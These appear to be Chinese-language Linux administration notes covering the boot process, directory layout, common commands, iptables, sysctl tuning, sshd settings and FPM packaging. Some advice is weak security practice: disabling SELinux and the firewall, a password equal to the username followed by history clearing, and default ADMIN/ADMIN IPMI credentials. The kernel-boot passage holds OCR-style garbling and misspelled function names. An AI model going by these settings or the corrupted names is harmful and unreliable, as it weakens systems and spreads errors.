	 系统将解压后的内核放置在内存之中，并调用start_kernel()函数来启动
	 一系列的初始化函数并初始化各种设备，完成Linux核心环境的建立。至此，
	 Linux内核已经建立起来了，基于Linux的程序应该可以正常运行了。

	 start_kenrel() 定义在init/main.c中，它就类似于一般可执行程序中的
	 main()函数，系统在此之前所做的仅仅是一些能让内核程序最低限度执行
	 的初始化操作， 真正的内核初始化过程是从这里才开始。函数
	 start_kerenl()将会调用一系列的初始化函数，用来完成内核本身的各方
	 面设置，目的是最终建立起基 本完整的Linux核心环境。

	 start_kernel()中主要执行了以下操作:
	 1. 在屏幕上打印出当前的内核版本信息。
     2. 执行setup_arch()，对系统结构进行设置。
     3. 执行sched_init()，对系统的调度机制进行初始化。先是对每个可用
        CPU上的runqueque进行初始化;然后初始化0号进程(其task struct和系
        统空M堆栈在startup_32()中己经被分配)为系统idle进程，即系统空闲
        时占据CPU的进程。
	 4. 执行parse_early_param()和parsees_args()解析系统启动参数。
	 5. 执行trap_in itQ，先设置了系统中断向量表。0－19号的陷阱门用于
        CPU异常处理;然后初始化系统调用向量;最后调用cpu_init()完善对CPU
        的初始化，用于支持进程调度机制，包括设定标志位寄存器、任务寄存
        器、初始化程序调试相关寄存器等等。
	 6. 执行rcu_init()，初始化系统中的Read-Copy Update互斥机制。
     7. 执行init_IRQ()函数，初始化用于外设的中断，完成对IDT的最终初始
        化过程。
	 8. 执行init_timers(), softirq_init()和time_init()函数，分别初始系
        统的定时器机制，软中断机制以及系统日期和时间。
	 9. 执行mem_init()函数，初始化物理内存页面的page数据结构描述符，完
        成对物理内存管理机制的创建。
	 10. 执行kmem_cache_init(),完成对通用slab缓冲区管理机制的初始化工
         作。
	 11. 执行fork_init()，计算出当前系统的物理内存容量能够允许创建的进
         程(线程)数量。
	 12. 执行proc_caches_init() , bufer_init(), unnamed_dev_init()
         ,vfs_caches_init(), signals_init()等函数对各种管理机制建立起
         专用的slab缓冲区队列。
     13. 执行proc_root_init()Wl数，对虚拟文件系统/proc进行初始化。

	 在 start_kenrel()的结尾，内核通过kenrel_thread()创建出第一个系统
	 内核线程(即1号进程)，该线程执行的是内核中的 init()函数，负责的是
	 下一阶段的启动任务。最后调用cpues_idle()函数:进入了系统主循环体口
	 默认将一直执行 default_idle()函数中的指令，即CPU的halt指令，直到
	 就绪队列中存在其他进程需要被调度时才会转向执行其他函数。此时，系
	 统中唯一存 在就绪状态的进程就是由kerne_hread()创建的init进程(内核
	 线程)，所以内核并不进入default_idle()函数，而是转向 init()函数继
	 续启动过程。
**** 初始化环境
	 内核被加载后，第一个运行的程序便是/sbin/init，该文件会读取
	 /etc/inittab文件，并依据此文件来进行初始化工作。

	 其实/etc/inittab文件最主要的作用就是设定Linux的运行等级，其设定形
	 式是“：id:5:initdefault:”，这就表明Linux需要运行在等级5上。Linux
	 的运行等级设定如下： 0：关机

	 1. 单用户模式
	 2. 无网络支持的多用户模式
	 3. 有网络支持的多用户模式
	 4. 保留，未使用
	 5. 有网络支持有X-Window支持的多用户模式
	 6. 重新引导系统，即重启
**** 配置系统环境
	 在设定了运行等级后，Linux系统执行的第一个用户层文件就是
	 /etc/rc.d/rc.sysinit脚本程序，它做的工作非常多，包括设定PATH、 设
	 定网络配置(/etc/sysconfig/network)、启动swap分区、设定/proc等等。
	 如果你有兴趣，可以到/etc/rc.d中查看 一下rc.sysinit文件。

	 系统初始化的大致内容总结如下：
	 #+BEGIN_EXAMPLE
	 硬件的初始化，图像界面启动的初始化(如果设置了默认启动基本) 
	 主机RAID的设置初始化，device mapper 及相关的初始化， 
	 检测根文件系统，以只读方式挂载 
	 激活udev和selinux 
	 设置内核参数 /etc/sysctl.conf 
	 设置系统时钟 
	 启用交换分区，设置主机名 
	 加载键盘映射 
	 激活RAID和LVM逻辑卷
	 挂载额外的文件系统 /etc/fstab 
	 最后根据mingetty程序调用login让用户登录->用户登录(完成系统启动)
	 #+END_EXAMPLE

	 在系统启动过程中主要的脚本和目录有:
	 #+BEGIN_EXAMPLE
	 boot
	 /grub
	 /boot/grub/grub.conf
	 /boot/initrd+内核版本
	 /initrd文件中的/proc/ /sys/ /dev/ 目录的挂载 及根的切换
	 /etc/inittab 脚本
	 /etc/rc.d/rc.sysinit 脚本 等
	 #+END_EXAMPLE

	 线程init的最终完成状态是能够使得一般的用户程序可以正常地被执行，
	 从而真正完成可供应用程序运行的系统环境。它主要进行的操作有:

	 1. 执行函数do_basic_setup()，它会对外部设备进行全面地初始化。
	 2. 构建系统的虚拟文件系统目录树，挂接系统中作为根目录的设备(其具
        体的文 件系统已经在上一步骤中注册)。
	 3. 打开设备/dev/console，并通过函数sys_dup()打开的连接复制两次，
        使得文件号0,1 ,2 全部指向控制台。这三个文件连接就是通常所说的
        “标准输入”stdin,“标准输出”stdout和“标准出错信息”stderr这三个标
        准I/O通道。
	 4. 准备好以上一切之后，系统开始进入用户层的初始化阶段。内核通过系
        统调用execve()加载执T子相应的用户层初始化程序，依次尝试加载程
        序"/sbin/initl"," /etc/init"," /bin/init'，和“/bin/sh。只要其
        中有一个程序加载获得成功，那么系统就将开始用户层的初始化，而不
        会再回到init()函数段中。至 此，init()函数结束，Linux内核的引导
        部分也到此结束。
**** 启动内核模块
	 具体是依据/etc/modules.conf文件或/etc/modules.d目录下的文件来装载
	 内核模块。

	 启动第八步－－执行不同运行级别的脚本程序

	 根据运行级别的不同，系统会运行rc0.d到rc6.d中的相应的脚本程序，来
	 完成相应的初始化工作和启动相应的服务。

	 启动第九步－－执行/etc/rc.d/rc.local

	 你如果打开了此文件，里面有一句话，读过之后，你就会对此命令的作用
	 一目了然：
	 #+BEGIN_EXAMPLE
	 # This script will be executed *after* all the other init scripts.
	 # You can put your own initialization stuff in here if you don’t
	 # want to do the full Sys V style init stuff.
	 #+END_EXAMPLE

	 rc.local就是在一切初始化工作后，Linux留给用户进行个性化的地方。你
	 可以把你想设置和启动的东西放到这里。
**** 进入登录状态
	 此时，系统执行/bin/login程序，已经进入到了等待用户输入用户名和密
	 码的时候了，你已经可以用自己的帐号登入系统了。
** Linux目录结构及用途
   | Directory | Usage                                                                                     |
   |-----------+-------------------------------------------------------------------------------------------|
   | \/        | root of the virtual directory, where normally, no files are placed                        |
   |-----------+-------------------------------------------------------------------------------------------|
   | /bin      | binary directory, where many GNU user-level utilies are stored                            |
   |-----------+-------------------------------------------------------------------------------------------|
   | /boot     | boot directory, where boot files are stored                                               |
   |-----------+-------------------------------------------------------------------------------------------|
   | /dev      | device directory, where Linux creates device nodes                                        |
   |-----------+-------------------------------------------------------------------------------------------|
   | /etc      | system configuration files directory                                                      |
   |-----------+-------------------------------------------------------------------------------------------|
   | /home     | home directory, where Linux creates user directories                                      |
   |-----------+-------------------------------------------------------------------------------------------|
   | /lib      | library directory, where system and application library files are stored                  |
   |-----------+-------------------------------------------------------------------------------------------|
   | /media    | media directory, a common place for mount points used for removable media                 |
   |-----------+-------------------------------------------------------------------------------------------|
   | /mnt      | mount directory, another common place for mount points used for removable media           |
   |-----------+-------------------------------------------------------------------------------------------|
   | /opt      | optional directory, often used to store third-party software packages and data files      |
   |-----------+-------------------------------------------------------------------------------------------|
   | /porc     | process directory, where current hardware and process information is stored               |
   |-----------+-------------------------------------------------------------------------------------------|
   | /root     | root home directory                                                                       |
   |-----------+-------------------------------------------------------------------------------------------|
   | /sbin     | system binary directory, where many GNU admin-level utilies are stored                    |
   |-----------+-------------------------------------------------------------------------------------------|
   | /run      | run directory, where runtime data is held during system operation                         |
   |-----------+-------------------------------------------------------------------------------------------|
   | /srv      | service directory, where local services store their files                                 |
   |-----------+-------------------------------------------------------------------------------------------|
   | /sys      | system directory, where system hardware information files are stored                      |
   |-----------+-------------------------------------------------------------------------------------------|
   | /tmp      | temporary directory, where temporary work files can be created and destroyed              |
   |-----------+-------------------------------------------------------------------------------------------|
   | /usr      | user binary directory, where the bulk of GNU user-level utilies and data files are stored |
   |-----------+-------------------------------------------------------------------------------------------|
   | /var      | variable directory, for files that change frequency, such as log files                    | 

   The common Linux directory names are based upon the Filesystem
   Hierarchy Standard (FHS). Many Linux distributions maintain
   compliance with FHS. Therefore, you should be able to easily fi nd
   fi les on any FHS-compliant Linux systems.
** 输入输出重定向
   1. 标准输入（stdin），代码为数字0，使用<或<<。数据流向从右向左
   2. 标准输出（stdout），代码为数字1，使用>或>>。数据流向从左向右
   3. 错误输出（stderr），代码为数字2，使用2>或2>>。

   箭头的指向就是数据的流向。

   一个示例：
   #+BEGIN_EXAMPLE
   &>word
   把标准输出与标准错误重定向到word文件
   #+END_EXAMPLE
** Gnu/Linux常用命令
*** useradd与userdel
	useradd用来添加用户，常用选项，
	#+BEGIN_EXAMPLE
	-g 指定group id
	-u 指定user id
	-c 用户说明，comment
	-s 指定用户登录shell
	-d 指定用户家目录
	-G 指定附加组
	-M 不创建用户家目录
	-D 修改用户默认属性
	-e 指定用户账户过期时间
	#+END_EXAMPLE

	userdel用来删除用户，常用选项，
	#+BEGIN_EXAMPLE
	-r 删除用户家目录及mail spool
	#+END_EXAMPLE
*** cat
	#+BEGIN_SRC sh
# cat > test.txt << EOF
> test1
> test2
> test3
EOF
	#+END_SRC
*** find
**** 常用选项
**** 一些实例
	 #+BEGIN_SRC sh
# find /path -type f -exec rm -rf {} \;
	 #+END_SRC

	 一些实例：
	 1. 删除一个目录下的所有文件，但保留一个指定的文件
	    #+BEGIN_EXAMPLE
		# cd /home/lavenliu
		# touch file{1..10}
		# find ./ -type f ! -name "file10" -exec rm -rf {} \;
		# find ./ -type f ! -name "file10" |xargx rm -rf
		#+END_EXAMPLE
*** uname
	打印系统信息。
	
	1. 查看内核版本
	   #+BEGIN_SRC sh
	   # uname -r
	   #+END_SRC
	2. 查看机器多少位系统
	   #+BEGIN_SRC sh
	   # uname -m
	   #+END_SRC
	3. 查看主机名
	   #+BEGIN_SRC sh
	   # uname -n
       # 等价于hostname
	   #+END_SRC
*** hostname
	查看或设置主机名。
	#+BEGIN_SRC sh
# hostname
lavenliu # 不带参数就是查看主机名
# hostname richrad # 带参数就是修改主机名，重启失效
# hostname
richrad
	#+END_SRC
*** tail与head
	一对相反的命令。

	tail默认是查看文件的末尾10行内容；head默认是查看文件的前10行。

	可以使用"-nK"指定查看文件的前（或末尾）K行的内容。

	tail的另外一个用法是加上"-f"选项，可以实时查看文件的追加情况。如大
	多数日志文件都是以追加的方式写入内容，如/var/log/messages，使用
	"tail -f /var/log/messages"可以动态查看messages文件的变化情况。另
	外tailf命令与"tail -f"效果相同。
*** grep
**** 常用选项
**** 一些实例
*** sed
**** 常用选项
**** 一些实例
*** awk
**** 常用选项
**** 一些实例
*** mkisofs
   	#+BEGIN_EXAMPLE
   	# 制作ISO镜像
   	mkisofs -joliet-long -o ccc1.iso puppet_src
   	#+END_EXAMPLE
*** parted
*** wget
*** iptables
   	#+BEGIN_EXAMPLE
   	规则：匹配标准
   	IP: SIP, DIP
   	TCP: SPORT, DPORT
   	UDP: SPORT, DPORT
   	ICMP: icmp-type

   	hook function: 钩子函数
   	prerouting
   	input
   	output
   	forward
   	postrouting

   	规则链：
   	PREROUTING
   	INPUT
   	OUTPUT
   	POSTROUTING


   	filter(过滤)：表
   	INPUT
   	OUTPUT
   	FORWARD

   	nat(地址转换):表
   	PREROUTING
   	POSTROUTING

   	mangle(拆开、修改、封装):表
   	PREROUTING
   	INPUT
   	FORWARD
   	OUTPUT
   	POSTROUTING

   	raw():表
   	PREROUTING
   	OUTPUT

   	优先级：
   	入站数据流向：
   	raw： PREROUTING
   	mangle： PREROUTING
   	nat： PREROUTING

   	本机的应用进程:
   	mangle: INPUT
   	filter： INPUT

   	raw: OUTPUT
   	mangle: OUTPUT
   	nat: OUTPUT
   	filter: OUTPUT

   	转发数据流向：
   	mangle： FORWARD
   	filter:  FORWARD

   	出站的数据流向：
   	mangle: POSTROUTING
   	nat: POSTROUTING

   	可以使用自定义链，但只在被调用时才能发挥作用，而且如果没有自定义链中
   	的任何规则匹配，还应该有返回机制。

   	用户可以删除自定义的空链
   	默认链不能被删除

   	每个规则都有两个内置的计数器：
   	被匹配的报文个数
   	被匹配的报文大小之和

   	规则：匹配标准，处理动作

   	iptables [-t TABLE] COMMAND CHAIN [num] 匹配标准 -j 处理办法

   	匹配标准：
	  通用匹配
	   	-s, --src: 指定源地址 
	   	-d, --dst: 指定目标地址
	   	-p {tcp|udp|icmp}: 指定协议
	   	-i INTERFACE: 指定数据报文流入的接口
		   可用于定义标准的链：PREROUTING, INPUT, FORWARD
	   	-o INTERFACE: 指定数据报文流出的接口
		   可用于定义标准的链：OUTPUT, POSTROUTING, FORWARD

	  扩展匹配
	   	隐含扩展：不用特别指明由哪个模块进行的扩展，因为此时使用-p {tcp|udp|icmp}
		   	-p tcp
			   --sport PORT[-PORT] - 源端口
			   --dport PORT[-PORT] - 目标端口
			   --tcp-flags mask comp - 只检查mask指定的标志位，是逗号分割的标志位列表
									   comp： 此列表中出现的标记位必须为1，comp中没有出现
											  而mask中出现的，必须为0
			   eg: --tcp-flags SYN,FIN,ACK,RST SYN = --syn 匹配三次握手中的第一次
	   	显示扩展：必须指明由哪个模块进行的扩展，在iptables中使用-m选项可以完成此功能

   	-j TARGET
	   ACCEPT
	   DROP
	   REJECT


   	rpm -ql iptables



   	命令：
	   管理规则：
	   -A 附加一条规则，添加在链的尾部
	   -I CHAIN [num] 插入一条规则，插入为对应CHAIN上的第num条
	   -D CHAIN [num] 删除指定链中的第num条规则
	   -R CHAIN [num] 替换指定的规则

	   管理链：
	   -F [CHAIN] - flush，清空指定规则链，如果省略CHAIN，则可以实现删除对应表中的所有链
	   -P CHAIN - 设定指定链的默认策略
	   -N - 自定义一个新的空链
	   -X - 删除一个自定义的空链
	   -Z - 置零指定链中所有规则的计数器
	   -E - 重命名自定义的链

	   查看类：
	   -L - 显示指定表中的规则
		   	-n - 以数字格式显示主机地址和端口号
		   	-v - 显示详细信息
		   	-x - 显示计数器的精确值
		   	--line-numbers - 显示规则号码

	   执行的动作：
		 ACCEPT - 放行
		 DROP - 丢弃
		 REJECT - 拒绝
		 DNAT - 目标地址转换
		 SNAT - 源地址转换
		 REDIRECT - 端口重定向
		 MASQUERADE - 地址伪装(源地址转换)
		 LOG - 日志
		 MARK - 打标记


   	iptables不是服务，但有服务脚本，服务脚本的主要作用在于管理保存的规则
   	#+END_EXAMPLE
** Gnu/Linux运行级别
   配置文件为/etc/inittab

   几种级别模式，
   #+BEGIN_EXAMPLE
   0 - 关机模式
   1 - 单用户模式
   2 - 多用户模式，没有NFS服务，与3级别相同
   3 - 完全多用户模式
   4 - 未使用
   5 - 图形化模式
   6 - 重启模式
   #+END_EXAMPLE

   查看当前运行级别：
   #+BEGIN_SRC sh
   # who -r
   run-level 3  2016-02-24 11:13
   # 或
   # runlevel
   N 3
   # 切换运行级别
   # init 3
   #+END_SRC
** 时间同步及定时任务配置
   #+BEGIN_SRC sh
ntpdate time.nist.gov
date
echo "*/5 * * * * /usr/sbin/ntpdate time.nist.gov &> /dev/null" >> /var/spool/cron/root
crontab -l
   #+END_SRC

   在机器数量少时，可利用以上定时任务去互联网同步时间，如果机器数量较
   大，最好在内网部署一个时间同步服务器，然后让自己的内网服务器同步这
   台服务器的时间即可。
** 文件描述符介绍及配置

   调整最大打开文件数，
   #+BEGIN_SRC sh
# ulimit -n
# ulimit -SHn 65535 # 临时修改，重启系统则不生效
# 可以把上述命令放在/etc/rc.d/rc.local文件中，
# 或者修改/etc/security/limits.conf
# echo "*      -    nofile 65535" >> /etc/security/limits.conf
# tail -1 /etc/security/limits.conf
# 退出当前SSH会话，然后重新登录即可
# ulimit -n
   #+END_SRC
** 隐藏Linux软件名内核版本
   #+BEGIN_SRC sh
# cat /etc/issue
# cat /etc/issue.net
# > /etc/issue
# 可以修改其他的内容
   #+END_SRC
** 禁止ping
   此项优化不是必须的，而且有时我们自己也会通过ping来检查服务器是否异
   常，要求很高的中小企业服务器，设置禁止ping也是可以的。从安全角度来
   说，禁止ping会增加系统安全的。禁止ping的命令如下：
   #+BEGIN_SRC sh
   # echo "net.ipv4.icmp_echo_ignore_all=1" >> /etc/sysctl.conf
   # tail -1 /etc/sysctl.conf
   # sysctl -p
   #+END_SRC
** Linux基础优化与安全重点小结
   参考文档：http://oldboy.blog.51cto.com/2561410/988729

   1. 不用root管理，以普通用户通过sudo授权管理。
   2. 更改默认的SSH服务端口，禁止root用户远程连接，甚至要更改为只监听
      内网IP。
   3. 定时自动更新服务器时间，使其和互联网时间同步。
   4. 配置yum更新源，从国内更新源下载安装软件包。
   5. 关闭SELinux及iptables
   6. 调整文件描述数量、进程及文件的打开都会消耗文件描述符。
   7. 定时自动清理邮件目录垃圾文件，放置inodes节点被占满。
   8. 精简并保留必要的开机自启动服务（如crond、sshd、network、rsyslog等）。
   9. 内核参数优化/etc/sysctl.conf。
   10. 如果要支持中文，修改字符集。
   11. 锁定关键系统文件，如/etc/passwd，/etc/shadow，/etc/group，
       /etc/inittab，/etc/gshadow等，处理以上内容后，把chattr与lsattr
       改名为lavenliu，这样就安全多了。
   12. 清空/etc/issue、/etc/issue.net，去除系统及内核版本登录前的提示
       输出信息。
   13. 清除多余的系统虚拟账号（如shell为/sbin/nologin的账户）。
   14. 为grub菜单加密。
   15. 禁止被ping

   Linux优化之安全最小化5个思想原则，
   1. 安装系统最小化，即选包最小化，域名安装软件最小化，无用的包不安装。
   2. 开机自启动服务最小化，即无用的服务不开启。
   3. 操作命令最小化。如，使用rm -f test.txt而不是rm -rf text.txt
   4. 登录Linux用户最小化。平时没有需求不用root登录，用普通用户即可。
      普通用户授权最小化，即只给必须的管理系统的命令。
   5. Linux系统文件及目录的权限设置最小化，禁止随意创建、更改与删除。
** 配置软件下载更新YUM源地址
   #+BEGIN_SRC sh
mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup
wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repo
yum makecache
   #+END_SRC
** 清理开机自启动的服务
   先关闭所有的服务：
   #+BEGIN_EXAMPLE
for service in `chkconfig --list |grep 3:on |awk '{ print $1 }'` ; 
do 
    chkconfig --level 3 ${service} off;
done
   #+END_EXAMPLE
   
   再开启需要的服务：
   #+BEGIN_EXAMPLE
   for service in crond network rsyslog sshd ; 
   do
       chkconfig --level 3 ${service} on;
   done

# 或者
chkconfig --list |grep 3:on |egrep -v "sshd|rsyslog|crond|network|jenkins" |awk '{ print $1 }' |sed -r 's#(.*)#chkconfig \1 off#g'
   #+END_EXAMPLE

   检查结果：
   #+BEGIN_EXAMPLE
   chkconfig --list |grep 3:on
   #+END_EXAMPLE

   我们应该遵守这样一个原则：最小化原则。就是尽量不安装不使用的软件，
   尽量不开启不需要的服务。即只要不用就不要开启，这样系统的性能和安全
   性才是最好的。
** 用户管理
   使用useradd添加一个普通账户，并设置其登录密码：
   #+BEGIN_SRC sh
   # useradd lavenliu
   # passwd lavenliu   
   #+END_SRC
   提示：
   1. 一般情况下，生产环境应尽量避免直接到root用户下操作；
   2. 还可通过下面命令一步到位的设置密码，
	  #+BEGIN_SRC sh
	  # echo "lavenliu" |passwd --stdin lavenliu && history -c
	  #+END_SRC
*** 将普通用户加入sudo
	为了安全及管理的方便，可将需要有root权限的用户名加入sudo管理，这样
	用户通过自己的普通账户登录，就可以以root的权限来管理整个系统，而不
	需要有root账号及密码。

	配置sudo：
	#+BEGIN_SRC sh
	# visudo  # 相当于编辑/etc/sudoer,
    # 找到如下内容
## Allow root to run any commands anywhere
root    ALL=(ALL)       ALL
    # 添加需要使用系统管理权限的用户
lavenliu  ALL=(ALL)     ALL
	#+END_SRC

	在生产环境中，建议应该禁止root远程登录，然后，为每个运维人员建立一
	个普通账号，然后根据运维人员的需求，通过sudo控制登录系统的权限，这
	是一个不错的权限管理方式。
*** 普通用户的环境变量问题
	如果命令找不到，说明$PATH变量有问题。可以通过与root用户的$PATH变量
	进行对比，找到不同之处。然后修改普通用户家目录下的.bash_profile文
	件或.bashrc文件进行PATH环境变量的修改即可。
** 中文显示问题
   配置文件是/etc/sysconfig/i18n，
   #+BEGIN_EXAMPLE
# echo 'LANG="zh_CN.GB18030"' > /etc/sysconfig/i18n
# source /etc/sysconfig/i18n
   #+END_EXAMPLE
   中文显示的配置要与SSH客户端的配置要一致。
** 服务器时间同步
   #+BEGIN_SRC sh
echo '*/5 * * * * /usr/sbin/ntpdate time.nist.gov > /dev/null 2>&1' >> /var/spool/cron/root
crontab -l
   #+END_SRC
** 系统资源限制配置
   配置文件为/etc/security/limits.conf，在文件末尾加上如下内容：
   #+BEGIN_EXAMPLE
   # *  - nofile  65535
   #+END_EXAMPLE

   重新登录系统即可，然后，使用"ulimit -n"查看结果。
** 内核参数优化
   一些常用的设置：
   #+BEGIN_EXAMPLE
net.ipv4.tcp_fin_timeout = 2
net.ipv4.tcp_tw_reuse = 1
net.ipv4.tcp_tw_recycle = 1
net.ipv4.tcp_syncookies = 1
net.ipv4.tcp_keepalive_time = 600
net.ipv4.ip_local_port_range = 4000 65000
net.ipv4.tcp_max_syn_backlog = 16384
net.ipv4.tcp_max_tw_buckets = 360000
net.ipv4.route.gc_timeout = 100
net.ipv4.tcp_syn_retries = 1
net.ipv4.tcp_synack_retries = 1
net.netfilter.nf_conntrack_max = 25000000
net.netfilter.nf_conntrack_tcp_timeout_established = 180
net.netfilter.nf_conntrack_tcp_timeout_time_wait = 120
net.netfilter.nf_conntrack_tcp_timeout_close_wait = 60
net.netfilter.nf_conntrack_tcp_timeout_fin_wait = 120
   #+END_EXAMPLE

   简要说明如下：
   #+BEGIN_EXAMPLE
net.ipv4.tcp_fin_timeout = 2 # 表示如果套接字由本端要求关闭，
                             # 这个参数决定了它保持在FIN-WAIT-2状态的时间。

net.ipv4.tcp_tw_reuse = 1    # 表示开启重用。允许将TIME-WAIT sockets重新
                             # 用于新的TCP连接，默认为0，表示关闭。

net.ipv4.tcp_tw_recycle = 1  # 表示开启TCP连接中TIME-WAIT sockets的快速回收，
                             # 默认为0，表示关闭
-----------提示：以上两个参数为了防止生产环境下time_wait过多而设置的-----------

net.ipv4.tcp_syncookies = 1 # 表示开启SYN Cookies。当出现SYN等待队列溢出时，
                            # 启用cookies来处理，可防范少量SYN攻击，默认为0。

net.ipv4.tcp_keepalive_time = 600 # 表示当keepalive启用的时候，TCP发送keepalive消息
                                  # 的频度。缺省是2个小时，改为10分钟。

net.ipv4.ip_local_port_range = 4000 65000 # 表示用于向外连接的端口范围。缺省情况下范围很小。

net.ipv4.tcp_max_syn_backlog = 16384 # 表示SYN队列的长度，默认为1024，加大队列
                                     # 长度，可以容纳更多等待连接的网络连接数。

net.ipv4.tcp_max_tw_buckets = 30000  # 表示系统同时保持TIME_WAIT套接字的最大数量，
                                     # 如果超过了这个数字，TIME_WAIT套接字将立刻
                                     # 被清除并打印警告信息。默认为180000，对于
                                     # Apache、Nginx等服务器来说可以调整低一点，
                                     # 改为5000-20000。

上几行的参数可以很好地减少TIME_WAIT套接字数量，但是对于Squid，效果却不大。
此项参数可以控制TIME_WAIT套接字的最大数量，避免Squid服务器被大量的TIME_WAIT
套接字拖死。

net.ipv4.route.gc_timeout = 100
net.ipv4.tcp_syn_retries = 1
net.ipv4.tcp_synack_retries = 1
net.ipv4.ip_conntrack_max = 25000000
net.ipv4.netfilter.ip_conntrack_max = 25000000
net.ipv4.netfilter.ip_conntrack_tcp_timeout_established = 180
net.ipv4.netfilter.ip_conntrack_tcp_timeout_time_wait = 120
net.ipv4.netfilter.ip_conntrack_tcp_timeout_close_wait = 60
net.ipv4.netfilter.ip_conntrack_tcp_timeout_fin_wait = 120
   #+END_EXAMPLE

   WEB业务的内核参数优化参考：
   #+BEGIN_SRC sh
fs.file-max=65535
net.ipv4.tcp_timestamps = 0
net.ipv4.tcp_synack_retries = 5
net.ipv4.tcp_syn_retries = 5
net.ipv4.tcp_tw_recycle = 1
net.ipv4.tcp_tw_reuse = 1
net.ipv4.tcp_fin_timeout = 30
#net.ipv4.tcp_keepalive_time = 120
net.ipv4.ip_local_port_range = 1024  65535
kernel.shmall = 2097152
kernel.shmmax = 2147483648
kernel.shmmni = 4096
kernel.sem = 5010 641280 5010 128
net.core.wmem_default=262144
net.core.wmem_max=262144
net.core.rmem_default=4194304
net.core.rmem_max=4194304
net.ipv4.tcp_fin_timeout = 10
net.ipv4.tcp_keepalive_time = 30
net.ipv4.tcp_window_scaling = 0
net.ipv4.tcp_sack = 0
kernel.hung_task_timeout_secs = 0
   #+END_SRC
   
   设置内核参数文件后，执行"/sbin/sysctl -p"使得修改生效。
** ipmitool基本使用
   1. 开启ipmi服务，并设置开机自启
      #+BEGIN_SRC sh
      service ipmi start
      chkconfig ipmi on
      #+END_SRC
   2. 设置通道1的IPMI地址为静态方式
      #+BEGIN_SRC sh
      ipmitool -I open lan set 1 ipsrc static
      ipmitool -I open lan set 1 ipaddr 192.168.2.58
      ipmitool -I open lan set 1 netmask 255.255.255.0
      ipmitool -I open lan set 1 defgw ipaddr 192.168.2.254
      #+END_SRC
   3. 重启MC
      #+BEGIN_SRC sh
      ipmitool -I open mc reset cold
      #+END_SRC
   4. 查看远程主机的电源状态信息
      #+BEGIN_SRC sh
      ipmitool -I lan -H 192.168.2.58 -U ADMIN -P ADMIN chassis power status
      #+END_SRC
   5. 开启或关闭远程主机
      #+BEGIN_SRC sh
      ipmitool -I lan -H 192.168.2.58 -U ADMIN -P ADMIN chassis power on|off
      #+END_SRC
** sshd服务配置
   更改配置前进行备份，是系统管理员的一个良好习惯。
   #+BEGIN_EXAMPLE
   # emacs /etc/ssh/sshd_config
   Port xxxx                # ssh连接默认的端口，谁都知道，必须要改
   PermitRootLogin no       # 禁用root用户远程登录
   PermitEmptyPasswords no  # 禁止空密码登录
   UseDNS no                # 不使用DNS
   #+END_EXAMPLE
** 解决系统性能问题的一般思路
** RPM包制作
*** 软件安装方式
	1. 编译安装
	   #+BEGIN_EXAMPLE
	   1. 优点是可以定制化安装目录、按需开启功能等；
	   2. 缺点是需要查找并实验出适合的编译参数，诸如MySQL之类的软件编译耗时过长；
	   #+END_EXAMPLE
	2. yum安装
	   #+BEGIN_EXAMPLE
	   1. 优点是全自动化安装，不需要为依赖问题发愁了；
	   2. 缺点是自主性太差，软件的功能、存放位置都已经固定好了，不易变更；
	   #+END_EXAMPLE
	3. 定制RPM包
	   #+BEGIN_EXAMPLE
	   根据自己的需求做成定制RPM包->搭建yum仓库->yum安装；
	   结合前两者的有点，暂未发现什么缺点。可能的缺点就是RPM包的通用性差；
	   一般人不会定制RPM包；
	   #+END_EXAMPLE
*** yum如何解决依赖问题
	在使用yum安装软件A时，yum会在下载完A的RPM包后，对该rpm包进行检查
	（rpm包中会给出安装该rpm包所依赖的基础库和软件）。如果检查出A的安
	装还要依赖软件B，那么此时yum就会自动下载并安装B。B安装完毕后，就会
	继续安装A。如果是内网yum源的话，只需要把B放在内网yum源即可。如果检
	查出A的安装不需要其他软件的支持，那么yum会自动安装A。

	如果使用fpm打包工具时，使用"-d"参数添加依赖关系。
*** 打包工具
**** rpmbuild
**** FPM打包工具
	 简单地说，FPM就是将一种类型的包转换成另一种类型。

	 支持的源类型包：
	 + dir    将目录打包成所需要的类型，可以用于源码编译安装的软件包
	 + rpm    对rpm进行转换
	 + gem    对rubygem包进行转换
	 + python 将python模块打包成相应的类型

	 支持的目标类型包：
	 + rpm     转换为rpm包
	 + deb     转换为deb包
	 + solaris 转换为solaris包
	 + puppet  转换为puppet模块
***** FPM安装
	  fpm是ruby写的，因此系统环境需要ruby，且ruby版本号大于1.8.5。
	  #+BEGIN_SRC sh
# 安装ruby模块
# yum -y install ruby rubygems ruby-devel

# 添加淘宝的Ruby仓库，速度问题；移除原生的Ruby仓库
# gem sources --add https://ruby.taobao.org/
# gem sources --remove http://rubygems.org/
# gem sources -l

# 安装fpm
# gem install fpm
	  #+END_SRC
***** FPM常用参数
	  详细使用请"fpm --help"

	  常用参数：
      | 参数             | 说明                                                                      |
      |------------------+---------------------------------------------------------------------------|
      | -s               | 指定源类型                                                                |
      | -t               | 指定目标类型                                                              |
      | -n               | 指定包的名字                                                              |
      | -v               | 指定包的版本号                                                            |
      | -C               | 指定打包的相对路径（Change directory to here before searching for files） |
      | -d               | 指定依赖于哪些包                                                          |
      | -f               | 第二次打包时，如果有同名安装包存在，则覆盖之                              |
      | -p               | 输出的安装包的目录，默认是当前目录                                        |
      | --post-install   | 软件包安装完成之后所有运行的脚本，同--after-install                       |
      | --pre-install    | 软件包安装完成之前所要运行的脚本，同--before-install                      |
      | --post-uninstall | 软件包卸载完成之后所要运行的脚本，同--after-remove                        |
      | --pre-uninstall  | 软件包卸载完成之前所要运行的脚本，同--before-remove                       | 
  
*** 定制Nginx软件包
	#+BEGIN_SRC sh
yum -y install pcre-devel openssl-devel
useradd nginx -M -s /sbin/nologin
cd /usr/local/src
wget http://nginx.org/download/nginx-1.9.1.tar.gz
tar -xf nginx-1.9.1.tar.gz
cd nginx-1.9.1
./configure --prefix=/application/nginx-1.9.1 \
--user=nginx --group=nginx \
--with-http_ssl_module \
--with-http_stub_status_module
make && make install
ln -s /application/nginx-1.9.1 /application/nginx
	#+END_SRC

	相对路径问题：
	#+BEGIN_SRC sh
# fpm -s dir -t rpm -n nginx -v 1.9.1 . # 解压出来路径会有问题
# fpm -s dir -t rpm -n nginx -v 1.9.1 /application/nginx-1.9.1
# fpm类似tar打包一样，只是fpm打的包能够被yum命令识别而已。
# fpm对软连接目录进行打包也会有问题
	#+END_SRC

	完整的命令：
	#+BEGIN_SRC sh
# vim /opt/scripts/nginx_rpm.sh
#!/bin/bash

useradd nginx -M -s /sbin/nologin
